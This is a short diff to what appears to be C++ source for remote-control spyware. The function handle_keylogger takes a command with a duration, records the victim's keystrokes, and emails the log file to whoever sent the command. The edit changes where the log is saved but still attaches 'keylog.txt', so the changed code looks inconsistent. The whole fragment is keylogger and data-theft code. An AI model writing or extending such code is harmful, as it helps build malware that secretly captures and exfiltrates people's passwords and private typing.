@@ -145,7 +145,7 @@ void handle_keylogger(const string& command) {
   iss >> cmd >> duration;
 
   cout << "Starting keylogger for " << duration << " seconds..." << endl;
-  start_keylogger("keylog.txt", duration);
+  run_keylogger_and_save(outdir, duration);
   if (!g_current_sender.empty()) {
     send_email_with_attachment(g_current_sender, "Keylogger output",
                                "Attached keylog", "keylog.txt");
